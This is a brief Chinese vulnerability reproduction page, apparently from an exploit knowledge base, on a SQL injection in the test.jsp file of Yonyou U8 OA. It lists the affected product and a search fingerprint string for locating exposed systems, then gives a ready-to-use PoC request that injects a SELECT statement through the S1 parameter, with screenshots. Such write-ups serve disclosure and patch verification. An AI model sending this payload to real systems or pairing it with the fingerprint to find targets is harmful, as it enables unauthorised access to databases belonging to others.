# 用友 U8 OA test.jsp SQL注入漏洞

## 漏洞描述

用友 U8 OA test.jsp文件存在 SQL注入漏洞，由于与致远OA使用相同的文件，于是存在了同样的漏洞

## 漏洞影响

<a-checkbox checked>用友 U8 OA</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"用友U8-OA"</a-checkbox></br>

## 漏洞复现

登录页面如下

![img](../../../.vuepress/public/img/yongyou-11.png)

验证POC

```plain
/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))
```



![img](../../../.vuepress/public/img/yongyou-12.png)